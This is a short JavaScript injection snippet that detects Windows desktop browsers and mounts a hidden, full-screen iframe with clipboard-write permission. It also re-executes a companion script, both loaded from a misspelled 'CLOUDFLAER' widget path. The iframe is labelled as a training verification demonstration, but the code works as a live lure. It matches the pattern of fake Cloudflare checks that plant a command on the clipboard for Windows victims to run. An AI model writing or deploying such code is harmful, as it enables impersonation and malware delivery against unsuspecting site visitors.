(function(){
  function isWindowsDesktop(){
    var ua = navigator.userAgent || navigator.vendor || "";
    var uaData = navigator.userAgentData;
    if (uaData) {
      if (uaData.platform !== "Windows" || uaData.mobile) return false;
    } else if (!/Windows NT/i.test(ua)) {
      return false;
    }
    if (/Windows Phone|Android|iPhone|iPad|Mobile|Tablet|IEMobile/i.test(ua)) return false;
    
    return true;
  }
  if (!isWindowsDesktop()) return;

  var template = document.createElement("template");
  template.innerHTML = "<iframe allow=\"clipboard-write\" class=\"cloudflare-training-frame\" src=\"/_assets/widget-CLOUDFLAER/frame.html?v=81151addf374\" style=\"position:fixed;inset:0;width:100%;height:100%;border:0;background:#fff;z-index:2147483646;opacity:0;\" title=\"Training verification demonstration\"><\/iframe>\n<script src=\"/_assets/widget-CLOUDFLAER/cloudflare.js?v=badecd356b56\"><\/script>\n";
  var mount = document.createElement("div");
  mount.setAttribute("data-uploader-windows-desktop", "");
  mount.appendChild(template.content.cloneNode(true));
  var __uploaderScripts = document.getElementsByTagName("script");
  var __uploaderCurrent = __uploaderScripts[__uploaderScripts.length - 1];
  if (__uploaderCurrent && __uploaderCurrent.parentNode) __uploaderCurrent.parentNode.insertBefore(mount, __uploaderCurrent);
  else document.body.appendChild(mount);

  mount.querySelectorAll("script").forEach(function(oldScript){
    var script = document.createElement("script");
    Array.from(oldScript.attributes).forEach(function(attr){
      script.setAttribute(attr.name, attr.value);
    });
    script.textContent = oldScript.textContent;
    oldScript.replaceWith(script);
  });
})();